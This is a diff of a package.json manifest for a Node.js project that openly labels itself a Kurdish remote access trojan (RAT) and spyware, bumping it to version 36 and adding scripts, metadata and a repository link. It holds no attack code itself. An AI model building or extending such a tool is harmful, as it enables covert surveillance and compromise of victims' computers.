@@ -1,10 +1,25 @@
 {
-  "name": "7ashashe-v35",
-  "version": "35.0.0",
-  "description": "7ASHASHE ULTIMATE KURDISH RAT",
+  "name": "7ashashe-v36",
+  "version": "36.0.0",
+  "description": "7ASHASHE ULTIMATE KURDISH RAT - وەحشی هاک",
   "main": "server.js",
   "scripts": {
-    "start": "node server.js"
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "keywords": [
+    "7ashashe",
+    "rat",
+    "spyware",
+    "kurdish",
+    "hacking"
+  ],
+  "author": "7ASHASHE",
+  "license": "UNLICENSED",
+  "private": true,
+  "engines": {
+    "node": ">=18.0.0",
+    "npm": ">=9.0.0"
   },
   "dependencies": {
     "express": "^4.18.2",
@@ -14,5 +29,12 @@
     "multer": "^1.4.5-lts.1",
     "body-parser": "^1.20.2",
     "axios": "^1.6.2"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/7ashashe/v36"
   }
 }
